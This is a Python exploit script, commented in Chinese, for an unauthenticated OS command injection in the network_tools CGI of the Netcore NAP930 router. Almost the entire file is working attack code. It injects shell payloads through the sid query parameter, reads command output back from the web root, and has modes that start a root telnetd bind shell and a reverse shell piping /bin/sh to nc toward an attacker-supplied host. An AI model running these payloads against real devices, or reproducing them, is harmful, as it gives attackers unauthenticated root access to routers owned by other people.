#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netcore NAP930 V0.1.241010.141410  未授权命令注入 (RCE) EXP
目标架构: aarch64 cortex-a53 / OpenWrt 21.02-SNAPSHOT (mediatek/mt7981)
漏洞位置: /www/cgi-bin/network_tools (shell CGI)
根因: urldecode 调用被注释, QUERY_STRING 原样进入
       eval "${key}='${val}'"  —— 且 eval 在 sid 鉴权检查之前执行
类型: CWE-78 (OS Command Injection) / 未授权 RCE
利用条件: 可达设备 Web 端口 (80/443/23355), 无需任何凭证

用法:
  python network_tools_rce.py <目标IP> [端口]           # 默认回显模式: id 验证
  python network_tools_rce.py <目标IP> 80 exec "命令"    # 执行任意命令(无回显,盲注)
  python network_tools_rce.py <目标IP> 80 telnetd 2323   # 真机推荐: 起 bind shell
  python network_tools_rce.py <目标IP> 80 revshell <LHOST> <LPORT>  # qemu-user 模拟环境用的反向输出通道

注意: 命令中的空格需写成 ${IFS}; 引号由脚本自动闭合, 自带命令不要再含未闭合单引号。
验证记录: qemu-user 模拟环境实测 uid=0(root) + 交互式 shell (2026-08)
"""
import sys
import urllib.request
import urllib.parse

PATH = "/cgi-bin/network_tools"


def inject(target, port, cmd):
    """把 cmd 塞进 eval "sid='...'" 的单引号里执行"""
    payload = "sid=';" + cmd + ";:'"
    # uhttpd 对 QUERY_STRING 不做 URL 解码, 但为稳妥对特殊字符做百分号编码
    url = "http://%s:%d%s?%s" % (target, port, PATH, urllib.parse.quote(payload, safe=""))
    try:
        urllib.request.urlopen(url, timeout=15).read()
    except Exception:
        pass  # 注入在 CGI 响应前已执行, 响应码/报文不影响结果


def exec_readback(target, port, cmd):
    """回显模式: 命令输出写到 web 根, 再 GET 取回 (设备 root 可写 /www)"""
    inject(target, port, cmd.replace(" ", "${IFS}") + "${IFS}>/www/pwn_out.txt")
    out = urllib.request.urlopen(
        "http://%s:%d/pwn_out.txt" % (target, port), timeout=10).read()
    return out.decode("utf-8", "replace")


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return
    target, port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 80
    mode = sys.argv[3] if len(sys.argv) > 3 else "id"

    if mode == "exec":
        print("[*] 盲注执行:", sys.argv[4])
        inject(target, port, sys.argv[4].replace(" ", "${IFS}"))
        print("[+] 已发送 (无回显, 结果需另行落地)")
    elif mode == "telnetd":
        p = sys.argv[4] if len(sys.argv) > 4 else "2323"
        inject(target, port, "telnetd${IFS}-p${IFS}%s${IFS}-l${IFS}/bin/sh" % p)
        print("[+] bind shell 已启动: telnet/nc %s %s 后直接是 root shell" % (target, p))
    elif mode == "revshell":
        lh, lp = sys.argv[4], sys.argv[5]
        # busybox nc 为极简版(无 -e/-l), 输入经文件驱动, 输出走反向 nc 通道:
        #   触发: touch /tmp/c; tail -f /tmp/c | /bin/sh | nc LHOST LPORT
        #   追加命令: echo <cmd> >> /tmp/c  (每次一条注入)
        inject(target, port, "touch${IFS}/tmp/c")
        inject(target, port,
               "tail${IFS}-f${IFS}/tmp/c|/bin/sh|nc${IFS}%s${IFS}%s" % (lh, lp))
        print("[+] 反向输出通道已连 %s:%s, 逐条发命令:" % (lh, lp))
        print("    python %s %s %d exec \"echo${IFS}id>>/tmp/c\"" % (sys.argv[0], target, port))
    else:  # 默认回显验证
        print("[*] 验证注入: id")
        print(exec_readback(target, port, "id"))


if __name__ == "__main__":
    main()
